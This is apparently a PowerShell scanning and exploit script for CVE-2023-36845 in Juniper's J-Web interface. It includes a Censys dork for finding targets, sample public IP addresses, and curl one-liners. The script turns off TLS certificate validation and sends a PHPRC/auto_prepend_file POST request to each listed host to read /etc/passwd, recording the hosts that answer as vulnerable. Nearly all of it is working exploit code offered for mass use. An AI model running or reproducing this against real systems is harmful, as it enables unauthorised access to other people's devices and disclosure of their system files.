cls 

$help = @"

Exploit CVE-2023–36845
----------------------
censys dork: `"Juniper Web Device Manager`"

https://royzsec.medium.com/how-i-exploited-cve-2023-36845-and-got-root-access-in-one-domain-d17f9e5cab4a

IP.txt file sample:

https://84.95.2.39
http://109.226.6.90

"@

Write-Host $Help -ForegroundColor Yellow
$input =  Read-Host "Press Enter to continue or (q) to quit"
if ($input -eq "q") {
    break
}


# https://royzsec.medium.com/how-i-exploited-cve-2023-36845-and-got-root-access-in-one-domain-d17f9e5cab4a
# https://stackoverflow.com/questions/17325293/invoke-webrequest-post-with-parameters

# curl -sk "https://185.17.234.141/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'
# cat ip.txt| while read host do;do curl -sk "$host" -X POST -d 'auto_prepend_file="/etc/passwd"'| grep -i 'root:' && echo "This is VULN";done

$RunTime = Get-Date -Format "dd-MM-yyyy"
$logFile = "$PSScriptRoot\JUNIPER-Report-$RunTime.txt"
Remove-Item $logFile -Force -ErrorAction SilentlyContinue

# bypassing SSL/TLS check
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

function Open-File([string] $initialDirectory){

    [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") | Out-Null

    $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog
    $OpenFileDialog.initialDirectory = $initialDirectory
    $OpenFileDialog.title = "Please choose the .txt file"
    $OpenFileDialog.filter = "All files (*.txt)| *.txt"
    $OpenFileDialog.ShowDialog() |  Out-Null

    return $OpenFileDialog.filename
} 

Write-Host "Please choose the <ip>.txt file:"
$OpenFile=Open-File $env:USERPROFILE 

if ($OpenFile -ne "") 
{
    echo "FileName: $OpenFile" 
} 
else 
{
    echo "No File was chosen"
    exit
}

$ip = Get-Content -Path $OpenFile

$x = 0
foreach($line in $ip)
{

$x = ++$X

$cmd = "curl.exe -sk `"$line/?PHPRC=/dev/fd/0`" -X POST -d `'auto_prepend_file=`"/etc/passwd`"`'"
$response = Invoke-Expression $cmd

try {

    $isRoot = ($response | Select-String -Pattern "root")

    if ($isRoot -eq $null) {
    
    "$x,NOT VULNERABLE,:-)" | Tee-Object -FilePath $logFile -Append
    
    } else {
    

   "$x,VULNERABLE,$isRoot" | Tee-Object -FilePath $logFile -Append
    
    }
    

} catch {
    
    $_.Exception.status

}
}


